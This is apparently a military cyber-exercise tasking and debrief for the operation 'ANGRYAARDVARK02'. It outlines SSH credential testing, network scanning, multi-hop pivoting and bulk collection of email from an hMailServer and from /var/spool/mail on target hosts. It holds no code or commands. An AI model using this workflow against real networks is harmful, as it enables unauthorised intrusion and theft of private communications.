Action: Test credentials via SSH masquerade. If successful, perform a @@device survey. @@@Collect any files of interest. Conduct network discovery to locate any mail servers in the ADMIN1’s internal network. Network discovery will at a minimum consist of scanning to determine all potential target IP’s, OS’s, and SSH Ports.  SSH ports for the potential target devices in this network are usually in the 33000-33999 range. Redirect to any additional targets of interest.

DEBRIEF 

Operator: 1LT An
Operation: ANGRYAARDVARK02

MC: mc2

Analyst: analyst2

Description: ANGRYAARDVARK is a C-ISR mission profile. On T1, we redirected to T2. On T2, we redirected to T3. On T3, we redirected to T4. On T4 we performed survey and scanned for T5 and T6. From T4, we moved to T5 and also conducted a survey and collected over 350 email files from 7 different email accounts. From T4, we also moved to T6 and conducted a survey and collected email files from 7 different email accounts. Overall, we were successful in collecting all necessary files from the targets. 
For collection, we found that T5 was running a hmailserver. It had seven users in the Workgroup folder where we located all the emails for that user. On T6, it was running IMAP server and we were able to locate all the emails in the /var/spool/mail where we collected all the emails within. 
Overall, we were able to enumerate new IP addresses for the FUOP and collected important emails that may used for mission planning in the future.
